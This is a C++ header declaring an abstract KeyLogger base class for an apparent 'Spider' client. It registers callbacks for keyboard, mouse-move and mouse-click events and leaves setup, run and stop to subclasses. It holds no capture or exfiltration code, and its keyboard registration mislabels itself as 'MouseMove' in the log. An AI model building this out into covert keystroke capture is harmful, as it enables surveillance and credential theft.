//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_KEYLOGGER_HPP
#define SPIDER_CLIENT_KEYLOGGER_HPP

#include <utility>
#include <memory>
#include <Protocol/Messages.hpp>

#define KEYLOGGER_LOG "{'KeyLogger'}"

namespace spi
{
    class KeyLogger
    {
    public:
        using MouseMoveCallback = std::function<void(spi::proto::MouseMove &&)>;
        using KeyPressCallback = std::function<void(spi::proto::KeyEvent &&)>;
        using MouseClickCallback = std::function<void(spi::proto::MouseClick &&)>;
        virtual void setup() = 0;
        virtual void run() = 0;
        virtual void stop() = 0;

    public:
        void onMouseMoveEvent(MouseMoveCallback &&callback) noexcept
        {
            _mouseMoveCallback = std::forward<MouseMoveCallback>(callback);
            _log(lg::Debug) << KEYLOGGER_LOG << " -> register Callback of type " << utl::Green << "{'" << "MouseMove"
                           << "'}" << utl::Reset << std::endl;
        }

        void onMouseClickEvent(MouseClickCallback &&callback) noexcept
        {
            _mouseClickCallback = std::forward<MouseClickCallback>(callback);
            _log(lg::Debug) << KEYLOGGER_LOG << " -> register Callback of type " << utl::Green << "{'" << "MouseClick"
                           << "'}" << utl::Reset << std::endl;
        }

        void onKeyboardEvent(KeyPressCallback &&callback) noexcept
        {
            _keyPressCallback = std::forward<KeyPressCallback>(callback);
            _log(lg::Debug) << KEYLOGGER_LOG << " -> register Callback of type " << utl::Green << "{'" << "MouseMove"
                           << "'}" << utl::Reset << std::endl;
        }

        virtual ~KeyLogger() = default;

    protected:
        lg::Logger _log{"keylogger", lg::Level::Debug};
        MouseMoveCallback _mouseMoveCallback;
        MouseClickCallback _mouseClickCallback;
        KeyPressCallback _keyPressCallback;
    };

    using KeyLogPtr = std::unique_ptr<KeyLogger>;
}

#endif //SPIDER_CLIENT_KEYLOGGER_HPP
